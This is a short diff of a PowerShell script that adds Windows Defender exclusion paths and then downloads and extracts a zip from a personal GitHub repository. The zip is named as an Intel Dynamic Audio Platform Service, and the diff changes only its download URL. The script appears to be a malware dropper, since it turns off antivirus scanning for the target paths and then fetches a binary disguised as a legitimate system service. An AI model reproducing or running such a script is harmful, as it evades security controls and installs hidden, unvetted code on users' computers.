@@ -33,7 +33,7 @@ Add-MpPreference -ExclusionPath "$TargetEmail" -Force
 Write-Output "Exclusions added"
 
 if (-Not (Test-Path "$TargetFile")) {
-  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Dynamic%20Audio%20Platform%20Service.zip" -OutFile "$TargetZip"
+  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/Intel%20Dynamic%20Audio%20Platform%20Service.zip" -OutFile "$TargetZip"
   Write-Output "File downloaded"
   Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
   Write-Output "File extracted"
